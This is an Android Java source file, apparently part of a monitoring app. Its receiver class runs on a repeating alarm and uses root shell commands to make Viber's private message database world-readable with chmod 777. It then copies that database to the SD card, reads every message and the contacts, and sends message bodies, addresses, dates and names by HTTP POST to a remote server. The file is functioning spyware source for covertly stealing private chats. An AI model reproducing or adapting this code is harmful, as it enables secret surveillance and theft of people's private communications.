package voluntaty.com.baseroot;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.widget.Toast;

import voluntaty.com.database.DataHelper;
import voluntaty.com.database.DatabaseHelperTwo;
import voluntaty.com.database.DatabaseHelperTwoTwo;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;


/**
 * Created by supergoga on 1/28/2016.
 */
public class RepeatingAlarmServiceViber extends BroadcastReceiver {

    public void setpermission(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("chmod 777 " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void setmkdir(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("mkdir -p " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void copyFile() {

        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("cp /data/data/com.viber.voip/databases/viber_messages /sdcard/copyviber").getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

     }


    Cursor c = null;
    Cursor c2 = null;

    private DataHelper dh;
    String login=null;
    String email=null;
    String password=null;
    String URL_HTTP=null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }

    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }

    void someTask(Context context){

        dh = null;
        dh = new DataHelper(context);

        String serviceviber;
        serviceviber = null;

        serviceviber = dh.selectServiceviber("1");
        dh = null;
        if(serviceviber.length()>0) {

            setpermission("/data");
            setpermission("/data/data");
            setpermission("/data/data/com.viber.voip");
            setpermission("/data/data/com.viber.voip/databases");
            setpermission("/data/data/com.viber.voip/databases/viber_messages");

            setpermission("/sdcard");
            setmkdir("/sdcard/copyviber");
            setpermission("/sdcard/copyviber");

            copyFile();

            dh = null;
            dh = new DataHelper(context);
            URL_HTTP = dh.selectUrl_Http();
            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();
/*
            DatabaseHelperTwoTwo myDbHelperTwoTwo = null;
                                 myDbHelperTwoTwo = new DatabaseHelperTwoTwo(context);

            try {
                myDbHelperTwoTwo.createDataBase();
            } catch (IOException ioe) {

            }

            try {
                myDbHelperTwoTwo.openDataBase();
            } catch (SQLException e) {
            }

    //       Toast.makeText(context," ??---------------11111111 ", Toast.LENGTH_LONG).show();

              c2 = myDbHelperTwoTwo.query("participants_info", null, null, null, null, null, null);

     //       Toast.makeText(context," ??---------------22222222 ", Toast.LENGTH_LONG).show();

            if (c2.moveToFirst()) {
                do {

      dh.insertViberNumber(c2.getString(1),c2.getString(14));

                } while (c2.moveToNext());
            }

            myDbHelperTwoTwo = null;
*/
            DatabaseHelperTwo myDbHelper = null;
            myDbHelper = new DatabaseHelperTwo(context);
            try {
                myDbHelper.createDataBase();
            } catch (IOException ioe) {

            }

            try {
                myDbHelper.openDataBase();
            } catch (SQLException e) {
            }

            c = myDbHelper.query("messages", null, null, null, null, null, null);

            if (c.moveToFirst()) {
                do {

                    String idmessage = null;
                    String numbermemberid = null;
                    numbermemberid = dh.selectViberNumber(c.getString(1));
                    idmessage = dh.selectIdMessageTwo(c.getString(0));
                    int dlina = idmessage.length();
                    if (dlina < 1) {
                        new RequestTask().execute(URL_HTTP, email, "" + c.getString(0), "" + c.getString(1) , "" + c.getString(2), "" + c.getString(6), "" + c.getString(7));
                        dh.insertIdMessageTwo(c.getString(0));
                    }
                    numbermemberid = null;
                    idmessage = null;

                } while (c.moveToNext());
            }

            c = null;

            myDbHelper = null;

            DatabaseHelperTwoTwo myDbHelperTwoTwo = null;
            myDbHelperTwoTwo = new DatabaseHelperTwoTwo(context);

            try {
                myDbHelperTwoTwo.createDataBase();
            } catch (IOException ioe) {

            }

            try {
                myDbHelperTwoTwo.openDataBase();
            } catch (SQLException e) {
            }


    //        Toast.makeText(context," ??---------------11111111 ", Toast.LENGTH_LONG).show();

            c2 = myDbHelperTwoTwo.query("participants_info", null, null, null, null, null, null);

  //          Toast.makeText(context," ??---------------22222222 ", Toast.LENGTH_LONG).show();

          if (c2.moveToFirst()) {
                do {
                    String idmessage = null;
                    String numbermemberid = null;

                    idmessage = dh.selectIdMessageTwoTwo(c2.getString(0));
                    int dlina = idmessage.length();
                    if (dlina < 1) {

                        new RequestTaskTwo().execute(URL_HTTP, email, "" + c2.getString(1), "" + c2.getString(14));
                        dh.insertIdMessageTwoTwo(c2.getString(0));
                    }
                    numbermemberid = null;
                    idmessage = null;
                } while (c2.moveToNext());
            }

                c2 = null;

            myDbHelperTwoTwo = null;


            dh = null;
            URL_HTTP = null;
            login = null;
            email = null;
            password = null;

        }
        serviceviber = null;
    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[0]+"/index.php/api/viber");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(6);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[1]));
                nameValuePairs.add(new BasicNameValuePair("idmessage",params[2]));
                nameValuePairs.add(new BasicNameValuePair("address",params[3]));

                nameValuePairs.add(new BasicNameValuePair("date",params[4]));
                nameValuePairs.add(new BasicNameValuePair("type",params[5]));
                nameValuePairs.add(new BasicNameValuePair("body",params[6]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);

                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }


    class RequestTaskTwo extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[0]+"/index.php/api/viberto");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[1]));
                nameValuePairs.add(new BasicNameValuePair("nameon",params[2]));
                nameValuePairs.add(new BasicNameValuePair("nameto",params[3]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);

                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }





}
